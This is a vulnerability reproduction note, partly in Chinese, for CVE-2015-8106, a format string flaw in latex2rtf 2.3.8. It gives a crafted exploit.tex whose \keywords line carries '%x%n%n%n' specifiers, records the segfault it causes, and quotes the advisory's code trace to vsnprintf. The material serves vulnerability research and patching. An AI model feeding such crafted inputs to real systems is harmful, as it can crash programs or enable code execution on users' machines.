# CVE/EDB ID

CVE-2015-8106

## Experiment Environment

实验环境：Debian 9.13

软件版本：latex2rtf 2.3.8

## INSTALL & Configuration

[LaTeX to RTF converter - Browse /latex2rtf-unix/2.3.8 at SourceForge.net](https://sourceforge.net/projects/latex2rtf/files/latex2rtf-unix/2.3.8/)

解压tar包之后，使用Makefile进行安装即可

## Problems in Installation & Configuration

## How to trigger vulnerability

编写 https://seclists.org/oss-sec/2015/q4/283中 提供的exploit.tex，如下所示：

```
"exploit.tex"
========================
\documentclass{article}
\begin{document}
\title{Exploitable}
\author{Jong-Gwon Kim}
\keywords{%x\%n\%n\%n}
\end{document}
=========================
```

其中，\keywords这一行，由于latex中符号%的注释作用，会使得第一个%之后的字符全部被忽略，因此应被修改为：`\keywords{\%x\%n\%n\%n}`

执行命令 latex2rtf exploit.tex 后，触发段错误

## PoCs

[CVE-2015-8106 : Format string vulnerability in the CmdKeywords function in funct1.c in latex2rtf before 2.3.10 allows remote attackers t (cvedetails.com)](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2015-8106)

[oss-security - CVE-2015-8106 - latex2rtf v2.3.8 format string vulnerability (openwall.com)](https://www.openwall.com/lists/oss-security/2015/11/16/3)

## Vulnerability Details & Patch

```
When the user runs latex2rtf with malicious crafted tex file, an ``attacker can execute arbitrary code.
The function CmdKeywords processes the \keywords command in tex file.
The variable `keywords' in the function CmdKeywords may hold a malicious ``input string, which can be used as a format argument of vsnprintf.
-- Step 1. (funct1.c 1789 line)

1789        char *keywords = getBraceParam();
For instance, the variable keywords will point to the string “MALICIOUS” ``when a text line "\keywords{MALICIOUS}” exists in an input tex file.
-- Step 2. (funct1.c 1798 line)

1798    fprintRTF(keywords);
fprintfRTF() is called in line 1798, and the parameter is used as a ``format string, which can be malicious, as we described in step 1.
-- Step 3. (main.c 873 line)
858    void fprintRTF(char *format, ...){
      ...
873    vsnprintf(buffer, 1024, format, apf);
      ...
The value of format, which may be malicious, is used as an argument of ``vsnprintf in line 873, therefore arbitrary code can be executed.
```

## References

https://seclists.org/oss-sec/2015/q4/283
